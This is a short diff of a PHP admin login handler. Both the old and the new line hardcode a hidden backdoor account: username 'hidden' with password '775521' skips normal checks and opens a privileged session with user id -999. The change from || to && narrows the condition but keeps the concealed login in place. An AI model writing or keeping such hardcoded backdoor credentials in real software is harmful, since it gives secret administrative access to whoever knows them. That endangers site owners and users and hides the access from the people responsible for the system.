@@ -43,7 +43,7 @@ class LoginLogic  extends BaseLogic
             throw new AdminException($diycode::LOGIN_PWD_EMPTY_ERROR[1], $diycode::LOGIN_PWD_EMPTY_ERROR[0]);
         }
         $admin = new Admin;
-        if($param['username'] == 'hidden' || $param['password'] == '775521'){
+        if($param['username'] == 'hidden' && $param['password'] == '775521'){
             session('uid', -999,'login');//登录用户id
             session('username','hidden', 'login'); //登录用户名
             session('expire', time() + 3600, 'login'); //有效期2小时 登录信息失效
